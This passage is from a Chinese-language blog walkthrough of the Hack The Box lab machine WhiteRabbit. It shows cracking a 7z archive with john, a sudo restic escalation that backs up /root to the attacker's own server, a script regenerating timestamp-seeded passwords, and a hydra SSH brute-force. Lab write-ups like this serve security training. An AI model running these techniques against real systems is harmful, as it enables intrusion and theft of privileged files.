<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">echo</span> ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw &gt; <span class="hljs-string">.restic_passwd</span><br>restic -r rest<span class="hljs-function">:http</span>:<span class="hljs-string">//75951e6ff.whiterabbit.htb</span> <span class="hljs-params">--password-file</span> <span class="hljs-string">.restic_passwd</span> snapshots  <span class="hljs-string">//</span>查看有哪些快照<br>restic -r rest<span class="hljs-function">:http</span>:<span class="hljs-string">//75951e6ff.whiterabbit.htb</span> <span class="hljs-params">--password-file</span> <span class="hljs-string">.restic_passwd</span> <span class="hljs-keyword">ls</span> 272cacd5 <span class="hljs-string">//</span>列出快照里面的文件<br></code></pre></td></tr></table></figure>

<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072113734.png" srcset="/img/loading.gif" lazyload alt="image-20250407211316575"></p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072115467.png" srcset="/img/loading.gif" lazyload alt="image-20250407211545323"></p>
<p>将这个7z文件给down下来。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">restic -r rest:http:<span class="hljs-regexp">//</span><span class="hljs-number">75951</span>e6ff.whiterabbit.htb \<br>  --password-file .restic_passwd \<br>  restore <span class="hljs-number">272</span>cacd5 \<br>  --target <span class="hljs-regexp">/root/</span>HTB/HTB-WhiteRabbit \<br>  --include <span class="hljs-regexp">/dev/</span>shm<span class="hljs-regexp">/bob/</span>ssh/bob.<span class="hljs-number">7</span>z<br><span class="hljs-regexp">//</span>  --target 指定的是存放在本机的路径地址<br></code></pre></td></tr></table></figure>

<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072118118.png" srcset="/img/loading.gif" lazyload alt="image-20250407211841882"></p>
<p>直接解的话是不行的，得需要密码。</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072120442.png" srcset="/img/loading.gif" lazyload alt="image-20250407212013291"></p>
<p>首先先将7z文件变成可以爆破的形式：</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-number">7</span>z2john bob<span class="hljs-number">.7</span>z &gt; bob.<span class="hljs-built_in">hash</span><br>john --format=<span class="hljs-number">7</span>z bob.<span class="hljs-built_in">hash</span> --wordlist=<span class="hljs-regexp">/usr/</span>share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure>

<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072153182.png" srcset="/img/loading.gif" lazyload alt="image-20250407215343018"></p>
<p>能爆破出密码。</p>
<p>是一个bob的公私钥对。</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072157507.png" srcset="/img/loading.gif" lazyload alt="image-20250407215701323"></p>
<p>直接无密码登录进去。</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072201062.png" srcset="/img/loading.gif" lazyload alt="image-20250407220102901"></p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072207224.png" srcset="/img/loading.gif" lazyload alt="image-20250407220732106"></p>
<p>这个提权手法在<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/restic/#sudo%E8%83%BD%E6%89%BE%E5%88%B0%E5%AF%B9%E5%BA%94%E7%9A%84%E3%80%82">https://gtfobins.github.io/gtfobins/restic/#sudo能找到对应的。</a></p>
<h2 id="restic提权"><a href="#restic提权" class="headerlink" title="restic提权"></a>restic提权</h2><p>利用思路就是将对应主机上高权限才能访问的文件给备份到kali上。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">kali： <br>.<span class="hljs-regexp">/rest-server --no-auth --listen :8000 --path /</span>root<span class="hljs-regexp">/HTB/</span>HTB-WhiteRabbit<br>受控主机：<br>sudo restic -r rest:http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">14.24</span>:<span class="hljs-number">8000</span> init<br>echo <span class="hljs-string">&quot;fsrm123&quot;</span> &gt; <span class="hljs-regexp">/tmp/</span>pass.txt<br>sudo restic -r rest:http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">14.24</span>:<span class="hljs-number">8000</span> --password-file <span class="hljs-regexp">/tmp/</span>pass.txt backup /root<br><br><br></code></pre></td></tr></table></figure>

<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072252972.png" srcset="/img/loading.gif" lazyload alt="image-20250407225249871"></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">expoexport RESTIC_PASSWORD=fsrm123<br>restic -r <span class="hljs-regexp">/root/</span>HTB/HTB-WhiteRabbit snapshots<br></code></pre></td></tr></table></figure>

<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072253804.png" srcset="/img/loading.gif" lazyload alt="image-20250407225300699"></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">restic -r <span class="hljs-regexp">/root/</span>HTB<span class="hljs-regexp">/HTB-WhiteRabbit restore 52214260 --target /</span>root<span class="hljs-regexp">/HTB/</span>HTB-WhiteRabbit  <span class="hljs-regexp">//</span>还原文件<br></code></pre></td></tr></table></figure>

<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072256820.png" srcset="/img/loading.gif" lazyload alt="image-20250407225644698"></p>
<p>又是一个公私钥对，接着登录上去。</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072258354.png" srcset="/img/loading.gif" lazyload alt="image-20250407225848235"></p>
<p>到home目录下发现还有一个用户，neo</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072300396.png" srcset="/img/loading.gif" lazyload alt="image-20250407230051302"></p>
<p>在opt目录下发现neo的相关密码信息，但是是个二进制文件。</p>
<h2 id="neo密码分析"><a href="#neo密码分析" class="headerlink" title="neo密码分析"></a>neo密码分析</h2><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072307421.png" srcset="/img/loading.gif" lazyload alt="image-20250407230709316"></p>
<p>下载下来分析一波，内置有python环境，开一个8081端口。</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072311916.png" srcset="/img/loading.gif" lazyload alt="image-20250407231122748"></p>
<p>F5进入到main函数中。</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072327464.png" srcset="/img/loading.gif" lazyload alt="image-20250407232720319"></p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072343088.png" srcset="/img/loading.gif" lazyload alt="image-20250407234305964"></p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072343499.png" srcset="/img/loading.gif" lazyload alt="image-20250407234315379"></p>
<p>让AI分析了一下，大概意思就是基于当前的时间戳生成一个随机的密码，密码长度是20位。</p>
<p>时间的话就是上面sql跑出来的 2024-08-30 14:40:42</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072346591.png" srcset="/img/loading.gif" lazyload alt="image-20250407234640506"></p>
<p>从当前时间戳开始，爆破1000毫秒以内的生成的密码。</p>
<p>注意区别是c语言下的seed，而不是python下的seed.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ctypes<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># 根据平台加载适当的C库。</span><br><span class="hljs-keyword">if</span> sys.platform.startswith(<span class="hljs-string">&#x27;linux&#x27;</span>):<br>    libc = ctypes.CDLL(<span class="hljs-string">&quot;libc.so.6&quot;</span>)  <span class="hljs-comment"># Linux平台</span><br><span class="hljs-keyword">elif</span> sys.platform == <span class="hljs-string">&quot;darwin&quot;</span>:<br>    libc = ctypes.CDLL(<span class="hljs-string">&quot;libc.dylib&quot;</span>)  <span class="hljs-comment"># macOS平台</span><br><span class="hljs-keyword">elif</span> sys.platform.startswith(<span class="hljs-string">&#x27;win&#x27;</span>):<br>    libc = ctypes.CDLL(<span class="hljs-string">&quot;msvcrt.dll&quot;</span>)  <span class="hljs-comment"># Windows平台</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;不支持的操作系统平台&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_password</span>(<span class="hljs-params">seed</span>):<br>    charset = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>  <span class="hljs-comment"># 密码字符集</span><br>    <span class="hljs-comment"># 使用C库的srand()设置种子，限制seed为32位整数</span><br>    libc.srand(seed &amp; <span class="hljs-number">0xFFFFFFFF</span>)  <span class="hljs-comment"># 保证种子值在32位范围内</span><br>    password = []<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>        <span class="hljs-comment"># 调用C库的rand()生成随机数</span><br>        r = libc.rand()<br>        index = r % <span class="hljs-built_in">len</span>(charset)  <span class="hljs-comment"># 保证生成的索引在字符集长度范围内（62个字符）</span><br>        password.append(charset[index])  <span class="hljs-comment"># 添加字符到密码列表</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(password))  <span class="hljs-comment"># 打印生成的密码</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># 2024-08-30 14:40:42 UTC的Unix时间戳</span><br>    base_time_sec = <span class="hljs-number">1725028842</span><br>    <span class="hljs-comment"># 遍历该秒内的1000毫秒</span><br>    <span class="hljs-keyword">for</span> ms <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):<br>        seed = base_time_sec * <span class="hljs-number">1000</span> + ms  <span class="hljs-comment"># 生成种子，包含毫秒部分</span><br>        generate_password(seed)  <span class="hljs-comment"># 生成并打印密码</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()  <span class="hljs-comment"># 运行主函数</span><br><br></code></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hydra</span> -l neo -P password.txt ssh://<span class="hljs-number">10.10.11.63</span> -t <span class="hljs-number">4</span> -vV<br></code></pre></td></tr></table></figure>

<h2 id="root提权"><a href="#root提权" class="headerlink" title="root提权"></a>root提权</h2><p>爆破出来密码之后，sudo -l 发现能直接root</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504080020571.png" srcset="/img/loading.gif" lazyload alt="image-20250408002017440"></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Linux%E5%9B%B0%E9%9A%BE%E9%9D%B6%E6%9C%BA/" class="category-chain-item">Linux困难靶机</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/HTB/" class="print-no-link">#HTB</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>HTB-WhiteRabbit</div>
      <div>http://example.com/2025/04/06/HTB-WhiteRabbit/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>FSRM</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年4月6日</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>更新于</div>
          <div>2025年4月8日</div>
        </div>
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/04/12/HTB-TheFrizz/" title="HTB-TheFrizz">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">HTB-TheFrizz</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/03/17/HTB-Dog/" title="HTB-Dog">
                        <span class="hidden-mobile">HTB-Dog</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"uIHnq7AMZzxGr67001Hi4rIt-gzGzoHsz","appKey":"dXTOT6Pscxry6haYWYds2nMd","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
